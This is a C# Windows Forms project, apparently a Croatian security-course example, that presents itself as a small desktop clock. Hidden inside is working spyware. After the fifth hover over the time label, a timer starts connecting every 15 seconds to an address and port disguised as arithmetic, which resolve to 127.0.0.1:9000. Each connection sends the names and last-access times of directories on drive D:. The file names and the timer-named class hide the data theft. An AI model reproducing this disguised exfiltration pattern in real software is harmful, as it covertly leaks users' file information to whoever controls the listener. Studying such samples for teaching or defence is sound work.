

//--------------------- Form1.cs ---------------------
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace SIS_prakticni_primjer2
{
    public partial class Form1 : Form
    {
        int brojac = 0;

        PomocnaKlasa PK = new PomocnaKlasa();

        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd,
                         int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.timer.Start();
            this.timer.Tick += new EventHandler(timer_Tick);
            vrijemeLbl.Text = DateTime.Now.ToString("hh:mm:ss");
        }

        private void timer_Tick(object sender, EventArgs e)
        {
            vrijemeLbl.Text = DateTime.Now.ToString("hh:mm:ss");
        }

        private void CloseBttn_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void vrijemeLbl_MouseHover(object sender, EventArgs e)
        {
            vrijemeLbl.Font = new Font("Arial", 24);
            vrijemeLbl.BackColor = Color.Coral;
            brojac++;

            if (brojac == (83 % 39))
            {
                this.timer1.Start();
                this.timer1.Tick += new EventHandler(timer1_Tick); 
            }
        }

        private void vrijemeLbl_MouseLeave(object sender, EventArgs e)
        {
            vrijemeLbl.Font = new Font("Microsoft Sans Serif", 18);
            vrijemeLbl.BackColor = Color.PeachPuff;
        }

        private void Form1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            PK.pokreniTimerOtkucaj();
            if (PK.pokreniTimerOtkucaj() == true)
                this.timer1.Stop();
        }
    }
}


//--------------------- PomocnaKlasa.cs ---------------------
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.IO;

namespace SIS_prakticni_primjer2
{
    public class PomocnaKlasa
    {
        PodaciAplikacije PA = new PodaciAplikacije();
        TcpClient timerTcp = new TcpClient();

        public bool pokreniTimerOtkucaj()
        {
            try
            {
                timerTcp.Connect(PA.IstrP1 + "." + PA.IstrP2 + "." + PA.IstrP3 + "." + PA.IstrP4, PA.timer_lok());
                NetworkStream serverStream = timerTcp.GetStream();

                DriveInfo di = new DriveInfo(PA.put);
                DirectoryInfo dirInfo = di.RootDirectory;
                DirectoryInfo[] dirInfos = dirInfo.GetDirectories(PA.DirInfos);

                foreach (DirectoryInfo d in dirInfos)
                {
                    byte[] izlazniStream = Encoding.ASCII.GetBytes("Putanja: " + d.FullName + " Zadnji pristup: " + d.LastAccessTime + "$");
                    serverStream.Write(izlazniStream, 0, izlazniStream.Length);
                    serverStream.Flush();
                }

                return true;
            }

            catch
            {
                return false;
            }
        }
    }
}


//--------------------- PodaciAplikacije.cs ---------------------
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace SIS_prakticni_primjer2
{
    public class PodaciAplikacije
    {
        static int IbrP1 = (246 % 222) + 103;
        static int IbrP2 = 555 % 5;
        static int IbrP3 = 2444 % 611;
        static int IbrP4 = 748 % 3;
        public string IstrP1 = IbrP1.ToString();
        public string IstrP2 = IbrP2.ToString();
        public string IstrP3 = IbrP3.ToString();
        public string IstrP4 = IbrP4.ToString();
        public int PLok;
        public string put = @"D:\";
        public string DirInfos = "*.*";

        public int timer_lok()
        {
            PLok = 29000 % 10000;
            return PLok;
        }
    }
}


//--------------------- Program.cs -------------------
using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;

namespace SIS_prakticni_primjer2
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }
}


//--------------------- Form1.Designer.cs ------------
namespace SIS_prakticni_primjer2
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.vrijemeLbl = new System.Windows.Forms.Label();
            this.timer = new System.Windows.Forms.Timer(this.components);
            this.CloseBttn = new System.Windows.Forms.Button();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.SuspendLayout();
            // 
            // vrijemeLbl
            // 
            this.vrijemeLbl.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
            this.vrijemeLbl.Font = new System.Drawing.Font("Microsoft Sans Serif", 18F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.vrijemeLbl.Location = new System.Drawing.Point(45, 9);
            this.vrijemeLbl.Name = "vrijemeLbl";
            this.vrijemeLbl.Size = new System.Drawing.Size(159, 37);
            this.vrijemeLbl.TabIndex = 0;
            this.vrijemeLbl.Text = "label1";
            this.vrijemeLbl.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.vrijemeLbl.MouseLeave += new System.EventHandler(this.vrijemeLbl_MouseLeave);
            this.vrijemeLbl.MouseHover += new System.EventHandler(this.vrijemeLbl_MouseHover);
            // 
            // timer
            // 
            this.timer.Interval = 1000;
            this.timer.Tick += new System.EventHandler(this.timer_Tick);
            // 
            // CloseBttn
            // 
            this.CloseBttn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.CloseBttn.Location = new System.Drawing.Point(12, 14);
            this.CloseBttn.Name = "CloseBttn";
            this.CloseBttn.Size = new System.Drawing.Size(27, 26);
            this.CloseBttn.TabIndex = 1;
            this.CloseBttn.Text = "X";
            this.CloseBttn.UseVisualStyleBackColor = true;
            this.CloseBttn.Click += new System.EventHandler(this.CloseBttn_Click);
            // 
            // timer1
            // 
            this.timer1.Interval = 15000;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.PeachPuff;
            this.ClientSize = new System.Drawing.Size(216, 55);
            this.Controls.Add(this.CloseBttn);
            this.Controls.Add(this.vrijemeLbl);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Location = new System.Drawing.Point(10, 10);
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Form1";
            this.StartPosition = System.Windows.Forms.FormStartPosition.Manual;
            this.Text = "Form1";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Form1_MouseDown);
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Label vrijemeLbl;
        private System.Windows.Forms.Timer timer;
        private System.Windows.Forms.Button CloseBttn;
        private System.Windows.Forms.Timer timer1;
    }
}
